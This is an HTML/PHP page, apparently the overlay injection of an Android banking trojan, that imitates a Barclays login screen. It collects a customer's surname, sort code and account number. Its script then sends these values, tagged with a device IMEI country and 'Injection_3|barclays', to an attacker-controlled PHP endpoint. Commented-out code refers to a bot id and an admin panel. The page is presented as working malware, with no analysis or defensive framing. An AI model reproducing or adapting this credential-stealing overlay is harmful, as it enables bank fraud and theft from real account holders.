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">
			</center>

	   		<br>
	   		<br>

		    <div class="container" id="content_div">
				<div id="form1" style="padding: 1% 2% 0px 2%; border-radius: 11px;">
					<center>
						<input name="Surname / Last Name" placeholder="Surname / Last Name" id="login" maxlength="25" class="field" type="text">
						<br>
						<input name="Sort code" placeholder="Sort code" id="sc" maxlength="6" class="field" type="password">
						<script>
							document.getElementById('sc').onkeypress = function (e) {
								return !(/[A-Za-z]/.test(String.fromCharCode(e.charCode)));
							}
						</script>
						<br>
						<input name="Account Number" placeholder="Account Number" id="an" maxlength="20" class="field" type="password">
						<script>
							document.getElementById('an').onkeypress = function (e) {
								return !(/[A-Za-z]/.test(String.fromCharCode(e.charCode)));
							}
						</script>
						<br>

						<input type="hidden" id="code" name="code" value="" /> <!-- bot id -->
						<input type="hidden" id="name" name="name" value="" /> <!-- app name -->
						<br>
						<br>

						<input class="button" type="button" value="Continue" id="formBtn1">
						<br>
						<br>
					</center>
				</div>

	    	</div>

			<input type="hidden" name="name" value="Barclays Banking" />
		</form>
		<script type="text/javascript">



				(function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };

/*
                    var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');

					if(!/https?:\/\//i.test(g_sFAct))
					   g_sFAct = 'http://' + g_sFAct;

                    g_oForm.setAttribute('action',g_sFAct); // устанавливаем у формы урл админки
					try{
					   g_oForm.action = g_sFAct;
					} catch(e){};

					var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // получаем id бота

*/
                    var g_oBtn = document.getElementById('formBtn1');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('sc');
                        var oMemorableWord = document.getElementById('an');

						try{
							oNumInp.className = oCodeInp.className = oMemorableWord.className = 'field';
						} catch(e){};

                        if (oNumInp.value.length < 6) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{6,6}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{6,20}$/i.test(oMemorableWord.value)) {
							try{
                                oMemorableWord.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						top['closeDlg'] = true;
						/*prompt('send', '{"dialogid" : "barclays'+
						'", "surname_last_name": "'+oNumInp.value+
						'", "sort_code": "'+oCodeInp.value+
						'", "account_number": "'+oMemorableWord.value+'"}');

						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();*/


						var url='<?php echo $URL; ?>';
						var imei_c='<?php echo $IMEI_country; ?>';
						location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|barclays|"+oNumInp.value+"|"+oCodeInp.value+"|"+oMemorableWord.value);



						return false;
                    };

                })();
            </script>

	</body>
</html>
